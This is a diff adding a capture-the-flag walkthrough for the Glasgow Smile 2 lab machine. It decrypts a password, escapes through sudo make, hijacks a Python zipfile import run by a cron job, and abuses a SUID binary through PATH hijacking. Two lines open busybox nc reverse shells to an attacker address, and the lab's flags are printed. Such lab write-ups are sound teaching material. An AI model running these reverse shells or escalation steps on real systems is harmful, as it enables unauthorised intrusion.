@@ -555,18 +555,329 @@ print "Encrypted string:" . $a18 . "\n\n\n";
 ?>
 ```
 \
+So basically , it is an encryption scheme , which just takes both the strings key1 and key2 and splits and based on flipping it adds ord(num)+A/F 
+\
+This is a decrypt script in py
+```bash
+def gws(s):
+    return sum(ord(c) for c in s)
+
+def decrypt():
+    key1='I make them laught a lot'
+    key2='Because jokers are wild'
+    enc='2188F2236A2200F2236A2269F2301A2263F2291A2186F2299A2255F2300A2186F2287A2268F2291A2264F2229A2270F2222A2262F2301A2265F2297A2259F2300A2257F2222A2256F2301A2268F2222A2251F2300A2275F2306A2258F2295A2264F2293A2186F2298A2265F2293A2259F2289A2251F2298A2198F2222A2262F2295A2261F2291A2186F2299A2265F2300A2255F2311A2200F2222A2238F2294A2255F2311A2186F2289A2251F2300A2193F2306A2186F2288A2255F2222A2252F2301A2271F2293A2258F2306A2198F2222A2252F2307A2262F2298A2259F2291A2254F2234A2186F2304A2255F2287A2269F2301A2264F2291A2254F2234A2186F2301A2268F2222A2264F2291A2257F2301A2270F2295A2251F2306A2255F2290A2186F2309A2259F2306A2258F2236A2186F2273A2265F2299A2255F2222A2263F2291A2264F2222A2260F2307A2269F2306A2186F2309A2251F2300A2270F2222A2270F2301A2186F2309A2251F2306A2253F2294A2186F2306A2258F2291A2186F2309A2265F2304A2262F2290A2186F2288A2271F2304A2264F2236A2188F2222A2239F2260A2240F2259A2205F2244A2225F2308A2239F2299A2229F2242A2238F2289A2244F2257A2274F2256A2258F2246A2272F2275A2223F2277A2271F2279A2255F2297A2221F2279A'
+    K1 = gws(key1)
+    K2 = gws(key2)
+
+    i = 0
+    out = ""
+
+    while i < len(enc):
+        j = i
+        while enc[j].isdigit():
+            j += 1
+
+        num = int(enc[i:j])
+        flag = enc[j]
+
+        if flag == 'A':
+            ch = chr(num - K2)
+        else:  # 'F'
+            ch = chr(num - K1)
+
+        out += ch
+        i = j + 1
+
+    return out
+
+print(decrypt())
+```
+\
+After running that script , we get this output 
+```bash
+"...some men aren't looking for anything logical, like money. They can't be bought, bullied, reasoned, or negotiated with. Some men just want to watch the world burn." UFVE36GvUmK4TcZCxBh8vUEWuYekCY
+```
+\
+And this is basically the password of user "bane" 
+\
+So we switch over to user bane
+```bash
+bane@glasgowsmile2:~$ cat user2.txt 
+GS2{5c851b5e9ec996b38b7d0a544013380e}
+```
+\
+And then i check for sudo permissions 
+```bash
+bane@glasgowsmile2:~$ sudo -l
+[sudo] password for bane: 
+Matching Defaults entries for bane on glasgowsmile2:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User bane may run the following commands on glasgowsmile2:
+    (carnage) /bin/make
+```
+\
+So , after referring this page "https://gtfobins.org/gtfobins/make/#shell" 
+\
+Using the command "sudo -u carnage make --eval='$(shell /bin/sh 1>&0)' ." , we get shell as carnage
+```bash
+bane@glasgowsmile2:~$ sudo -u carnage make --eval='$(shell /bin/sh 1>&0)' .
+$ id
+uid=1001(carnage) gid=1001(carnage) groups=1001(carnage),50(staff)
+$ python -c "import pty; pty.spawn('/bin/bash')"
+carnage@glasgowsmile2:/home/bane$ cd ~
+carnage@glasgowsmile2:~$ ls -la
+total 52
+drwxr-xr-x 5 carnage carnage 4096 Jul  6  2020 .
+drwxr-xr-x 6 root    root    4096 Jul  7  2020 ..
+-rw------- 1 carnage carnage    1 Feb  3 09:29 .bash_history
+-rw-r--r-- 1 carnage carnage  220 Jun 25  2020 .bash_logout
+-rw-r--r-- 1 carnage carnage 3526 Jun 25  2020 .bashrc
+drwxrwx--- 3 carnage venom   4096 Jul 13  2020 get_out
+drwx------ 3 carnage carnage 4096 Jun 27  2020 .gnupg
+drwxr-xr-x 3 carnage carnage 4096 Jun 27  2020 .local
+-rw-r--r-- 1 carnage carnage  807 Jun 25  2020 .profile
+-rw-r--r-- 1 carnage carnage   66 Jul  3  2020 .selected_editor
+-rw-r----- 1 carnage carnage   38 Jun 30  2020 user3.txt
+-rw-r--r-- 1 carnage carnage  165 Jun 30  2020 .wget-hsts
+-rw------- 1 carnage carnage  118 Jul  6  2020 .Xauthority
+carnage@glasgowsmile2:~$ cat user3.txt 
+GS2{988535ad480d747ef00c705541d08a6e}
+```
+```bash
+carnage@glasgowsmile2:~$ cd get_out/
+carnage@glasgowsmile2:~/get_out$ ls -la
+total 16
+drwxrwx--- 3 carnage venom   4096 Jul 13  2020 .
+drwxr-xr-x 5 carnage carnage 4096 Jul  6  2020 ..
+drwxrwx--- 2 carnage venom   4096 Jul  9  2020 devil
+-rw-r--r-- 1 venom   venom    299 Feb  3 10:52 devil.zip
+carnage@glasgowsmile2:~/get_out$ cd devil/
+carnage@glasgowsmile2:~/get_out/devil$ ls -la
+total 12
+drwxrwx--- 2 carnage venom 4096 Jul  9  2020 .
+drwxrwx--- 3 carnage venom 4096 Jul 13  2020 ..
+-rwxrwx--- 1 carnage venom  348 Jun 30  2020 vulnerable
+carnage@glasgowsmile2:~/get_out/devil$ cat vulnerable 
+|\. |           _    _      |  ,_ _ _      .|-|_  |-|_ _ 
+|/|(|  \/()L|  (/_\/(/_|`  (|(|||(_(/_  LL|||_||  |_||(/_
+       /                                                 
+ | _   .|  .,_  |-|_ _       | _   ,_     ,_|.  |_|-~)   
+(|(/_\/||  |||  |_||(/_  |)(||(/_  |||()()||||(||||_|    
+                         |                    _|
+```
+\
+After some time , i checked files owned by carnage and i found "/opt/get_help/help.txt"
+```bash
+carnage@glasgowsmile2:/opt/get_out$ cat help.txt 
 
 
 
+I wrote a script that automatically allows you to have a zip of your personal folder.
+Now you can also delete the zip by mistake, it will be created again.
+Am I good or not? ;)
 
+@@@  @@@  @@@@@@@@  @@@  @@@   @@@@@@   @@@@@@@@@@   
+@@@  @@@  @@@@@@@@  @@@@ @@@  @@@@@@@@  @@@@@@@@@@@  
+@@!  @@@  @@!       @@!@!@@@  @@!  @@@  @@! @@! @@!  
+!@!  @!@  !@!       !@!!@!@!  !@!  @!@  !@! !@! !@!  
+@!@  !@!  @!!!:!    @!@ !!@!  @!@  !@!  @!! !!@ @!@  
+!@!  !!!  !!!!!:    !@!  !!!  !@!  !!!  !@!   ! !@!  
+:!:  !!:  !!:       !!:  !!!  !!:  !!!  !!:     !!:  
+ ::!!:!   :!:       :!:  !:!  :!:  !:!  :!:     :!:  
+  ::::     :: ::::   ::   ::  ::::: ::  :::     ::   
+   :      : :: ::   ::    :    : :  :    :      :    
 
-
-
-
-
-
-After some time , i didnt know how to escalate privileges , so i ran pspy and i found a unique process being run by user wit uid 1002
+```
+\
+After some time , i didnt know how to escalate privileges , so i ran pspy and i found a unique process being run by user with uid 1002
 \
 <img width="758" height="22" alt="image" src="https://github.com/user-attachments/assets/89724dfa-eeab-4585-9f3a-b6ed5e12cde8" />
 \
+After this i experiment quite a bit , before understanding , that if i delete the devil.zip file from /home/carnage/get_out/ , it will rezip the contents of the folder in /home/carnage/get_out/ and make another devil.zip in the same location with the new modified folder 
+\
+So in this part it was a lot of guessing involved , first i thought that some binary like ( zip or tar ) might have been used , but since the cron job is running a pythons script , we had to think which python library can create .zip files
+\
+And it was "zipfile" library which is built-in , So  we have to perform a library Hijacking to make the cron , run our "zipfile"  when it is called.
+\
+You put a reverse shell payload in it and add this 
 ```bash
+carnage@glasgowsmile2:/opt/get_out$ cat zipfile.py 
+import os
+os.system("busybox nc 192.168.0.105 4445 -e /bin/sh")
+```
+\
+You have to keep the zipfile.py in the same folder as moonlight.py
+I tried doing other method (path hijacking) , like keeping this zipfile.py in another location like /tmp and then changing PATH , but it didnt work ,maybe the python script called it specifically
+
+\
+<img width="769" height="131" alt="image" src="https://github.com/user-attachments/assets/9ccfb062-2354-4ddf-b01d-efc426c5ee3a" />
+\
+finally , we got a reverse shell 
+```bash
+venom@glasgowsmile2:~$ id
+uid=1002(venom) gid=1002(venom) groups=1002(venom)
+venom@glasgowsmile2:~$ ls -la
+total 48
+drwxr-xr-x 5 venom venom 4096 Jun 30  2020 .
+drwxr-xr-x 6 root  root  4096 Jul  7  2020 ..
+-rw------- 1 venom venom    1 Feb  3 09:29 .bash_history
+-rw-r--r-- 1 venom venom  220 Jun 27  2020 .bash_logout
+-rw-r--r-- 1 venom venom 3526 Jun 27  2020 .bashrc
+drwx------ 3 venom venom 4096 Jun 27  2020 .gnupg
+drwx------ 3 venom venom 4096 Jun 27  2020 Ladies_and_Gentlmen
+drwxr-xr-x 3 venom venom 4096 Jun 27  2020 .local
+-rw-r--r-- 1 venom venom  807 Jun 27  2020 .profile
+-rw-r--r-- 1 venom venom   66 Jun 27  2020 .selected_editor
+-rw-r----- 1 venom venom   38 Jun 30  2020 user4.txt
+-rw------- 1 venom venom  177 Jun 27  2020 .Xauthority
+venom@glasgowsmile2:~$ cat user4.txt 
+GS2{b79aba0d627bcd2025e35c2a192e1d51}
+```
+\
+So , after some hit and trial , i see that these both produce same output
+```bash
+venom@glasgowsmile2:~/Ladies_and_Gentlmen/Gotham$ ls -la
+total 272
+drwxr-xr-x 2 venom venom  4096 Jun 30  2020 .
+drwx------ 3 venom venom  4096 Jun 27  2020 ..
+-rwsr-xr-x 1 root  root    988 Jun 23  2020 batman
+-rwsr-xr-x 1 root  root  16659 Dec 18  2020 gothamwillburn1
+-rwsr-xr-x 1 root  root  16744 Dec 18  2020 gothamwillburn10
+-rwsr-xr-x 1 root  root  16749 Dec 18  2020 gothamwillburn11
+-rwsr-xr-x 1 root  root  16752 Dec 18  2020 gothamwillburn12
+-rwsr-xr-x 1 root  root  16755 Dec 18  2020 gothamwillburn13
+-rwsr-xr-x 1 root  root  16660 Dec 18  2020 gothamwillburn2
+-rwsr-xr-x 1 root  root  16672 Dec 18  2020 gothamwillburn3
+-rwsr-xr-x 1 root  root  16720 Dec 18  2020 gothamwillburn4
+-rwsr-xr-x 1 root  root  16675 Dec 18  2020 gothamwillburn5
+-rwsr-xr-x 1 root  root  16699 Dec 18  2020 gothamwillburn6
+-rwsr-xr-x 1 root  root  16708 Dec 18  2020 gothamwillburn7
+-rwsr-xr-x 1 root  root  16723 Dec 18  2020 gothamwillburn8
+-rwsr-xr-x 1 root  root  16735 Dec 18  2020 gothamwillburn9
+venom@glasgowsmile2:~/Ladies_and_Gentlmen/Gotham$ cat batman 
+  ____    _  _____ __  __    _    _   _  __   _____  _   _    ____  ___  _   _ _   _    _      ____ ___ _____ _ 
+ | __ )  / \|_   _|  \/  |  / \  | \ | | \ \ / / _ \| | | |  / ___|/ _ \| \ | | \ | |  / \    |  _ \_ _| ____| |
+ |  _ \ / _ \ | | | |\/| | / _ \ |  \| |  \ V / | | | | | | | |  _| | | |  \| |  \| | / _ \   | | | | ||  _| | |
+ | |_) / ___ \| | | |  | |/ ___ \| |\  |   | || |_| | |_| | | |_| | |_| | |\  | |\  |/ ___ \  | |_| | || |___|_|
+ |____/_/   \_\_| |_|  |_/_/ _ \_\_| \_|   |_| \___/_\___/   \____|\___/|_| \_|_| \_/_/   \_\ |____/___|_____(_)
+                            / \  | | | |  / \  | | | |  / \  | | | |  / \  | |                                  
+                           / _ \ | |_| | / _ \ | |_| | / _ \ | |_| | / _ \ | |                                  
+                          / ___ \|  _  |/ ___ \|  _  |/ ___ \|  _  |/ ___ \|_|                                  
+                         /_/   \_\_| |_/_/   \_\_| |_/_/   \_\_| |_/_/   \_(_)     
+venom@glasgowsmile2:~/Ladies_and_Gentlmen/Gotham$ ./gothamwillburn4
+  ____    _  _____ __  __    _    _   _  __   _____  _   _    ____  ___  _   _ _   _    _      ____ ___ _____ _ 
+ | __ )  / \|_   _|  \/  |  / \  | \ | | \ \ / / _ \| | | |  / ___|/ _ \| \ | | \ | |  / \    |  _ \_ _| ____| |
+ |  _ \ / _ \ | | | |\/| | / _ \ |  \| |  \ V / | | | | | | | |  _| | | |  \| |  \| | / _ \   | | | | ||  _| | |
+ | |_) / ___ \| | | |  | |/ ___ \| |\  |   | || |_| | |_| | | |_| | |_| | |\  | |\  |/ ___ \  | |_| | || |___|_|
+ |____/_/   \_\_| |_|  |_/_/ _ \_\_| \_|   |_| \___/_\___/   \____|\___/|_| \_|_| \_/_/   \_\ |____/___|_____(_)
+                            / \  | | | |  / \  | | | |  / \  | | | |  / \  | |                                  
+                           / _ \ | |_| | / _ \ | |_| | / _ \ | |_| | / _ \ | |                                  
+                          / ___ \|  _  |/ ___ \|  _  |/ ___ \|  _  |/ ___ \|_|                                  
+                         /_/   \_\_| |_/_/   \_\_| |_/_/   \_\_| |_/_/   \_(_)
+```
+\
+When i check strings of that binary
+```bash
+venom@glasgowsmile2:~/Ladies_and_Gentlmen/Gotham$ strings gothamwillburn4
+/lib64/ld-linux-x86-64.so.2
+libc.so.6
+setuid
+system
+__cxa_finalize
+setgid
+__libc_start_main
+GLIBC_2.2.5
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+u/UH
+[]A\A]A^A_
+cat ./batman
+;*3$"
+GCC: (Debian 8.3.0-6) 8.3.0
+crtstuff.c
+deregister_tm_clones
+__do_global_dtors_aux
+completed.7325
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+gothamwillburn.c
+__FRAME_END__
+........EXTRA STUFF
+```
+\
+WE see that there is a line "cat ./batman"
+\
+So i create  binary with a reverse shell payload 
+```bash
+enom@glasgowsmile2:~/Ladies_and_Gentlmen/Gotham$ echo "busybox nc 192.168.0.105 4446 -e /bin/sh" > cat
+venom@glasgowsmile2:~/Ladies_and_Gentlmen/Gotham$ chmod +x cat
+venom@glasgowsmile2:~/Ladies_and_Gentlmen/Gotham$ cp cat /tmp
+venom@glasgowsmile2:~/Ladies_and_Gentlmen/Gotham$ export PATH=/tmp:$PATH
+venom@glasgowsmile2:~/Ladies_and_Gentlmen/Gotham$ echo $PATH
+/tmp:/usr/bin:/bin
+```
+\
+After this , if we run "./gothamwillburn4" , we get a reverse shell as root since , this is a SUID binary
+
+```bash
+root@glasgowsmile2:~/Ladies_and_Gentlmen/Gotham# id
+uid=0(root) gid=0(root) groups=0(root),1002(venom)
+root@glasgowsmile2:~/Ladies_and_Gentlmen/Gotham# cd /root
+root@glasgowsmile2:/root# ls -la
+total 60
+drwx------  6 root root 4096 Jul 17  2020 .
+drwxr-xr-x 18 root root 4096 Jun 18  2020 ..
+-rw-------  1 root root    1 Feb  3 09:29 .bash_history
+-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
+drwx------  3 root root 4096 Jun 22  2020 .cache
+drwx------  3 root root 4096 Jun 27  2020 .gnupg
+-rw-------  1 root root   28 Jul  6  2020 .lesshst
+drwxr-xr-x  3 root root 4096 Jun 18  2020 .local
+-rw-------  1 root root  516 Jun 23  2020 .mysql_history
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r-----  1 root root 3171 Jun 30  2020 root.txt
+-rw-r--r--  1 root root   66 Jun 18  2020 .selected_editor
+drwx------  2 root root 4096 Jul  4  2020 .ssh
+-rwxr-xr-x  1 root root 1567 Jul  9  2020 task.sh
+-rw-r--r--  1 root root  208 Jul  9  2020 .wget-hsts
+root@glasgowsmile2:/root# cat root.txt 
+      ....        .         ..                .x+=:.                                                     ...                                .          ..                           
+   .x88" `^x~  xH(`   x .d88"                z`    ^%                            x=~                 .x888888hx    :                       @88>  x .d88"               .--~*teu.    
+  X888   x8 ` 8888h    5888R                    .   <k                    u.    88x.   .e.   .e.    d88888888888hxx     ..    .     :      %8P    5888R               dF     988Nx  
+ 88888  888.  %8888    '888R         u        .@8Ned8"      uL      ...ue888b  '8888X.x888:.x888   8" ... `"*8888%`   .888: x888  x888.     .     '888R        .u    d888b   `8888> 
+<8888X X8888   X8?      888R      us888u.   .@^%8888"   .ue888Nc..  888R Y888r  `8888  888X '888k !  "   ` .xnxx.    ~`8888~'888X`?888f`  .@88u    888R     ud8888.  ?8888>  98888F 
+X8888> 488888>"8888x    888R   .@88 "8888" x88:  `)8b. d88E`"888E`  888R I888>   X888  888X  888X X X   .H8888888%:    X888  888X '888>  ''888E`   888R   :888'8888.  "**"  x88888~ 
+X8888>  888888 '8888L   888R   9888  9888  8888N=*8888 888E  888E   888R I888>   X888  888X  888X X 'hn8888888*"   >   X888  888X '888>    888E    888R   d888 '88%"       d8888*`  
+?8888X   ?8888>'8888X   888R   9888  9888   %8"    R88 888E  888E   888R I888>   X888  888X  888X X: `*88888%`     !   X888  888X '888>    888E    888R   8888.+"        z8**"`   : 
+ 8888X h  8888 '8888~   888R   9888  9888    @8Wou 9%  888E  888E  u8888cJ888   .X888  888X. 888~ '8h.. ``     ..x8>   X888  888X '888>    888E    888R   8888L        :?.....  ..F 
+  ?888  -:8*"  <888"   .888B . 9888  9888  .888888P`   888& .888E   "*888*P"    `%88%``"*888Y"     `88888888888888f   "*88%""*88" '888!`   888&   .888B . '8888c. .+  <""888888888~ 
+   `*88.      :88%     ^*888%  "888*""888" `   ^"F     *888" 888&     'Y"         `~     `"         '%8888888888*"      `~    "    `"`     R888"  ^*888%   "88888%    8:  "888888*  
+      ^"~====""`         "%     ^Y"   ^Y'               `"   "888E                                     ^"****""`                            ""      "%       "YP'     ""    "**"`   
+                                                       .dWi   `88E                                                                                                                  
+                                                       4888~  J8%                                                                                                                   
+                                                        ^"===*"`                                                                                                                    
+                                                                     
+
+What do you get when you cross a mentally-ill loner with a society that abandons him and treats him like trash!? 
+I'll tell you what you get:
+
+YOU GET WHAT YOU FUCKING DESERVE!
+
+
+Congratulations you pwned GS2!
+
+GS2{df135baa6a216b6fe05f57a1efc1c90f}
+
+If you liked my Virtual Machines, offer me a coffee, I'll work on the next one!
+
+https://www.buymeacoffee.com/mindsflee
+
+mindsflee
+
+
+```
+The End , Thank you for reading this
+
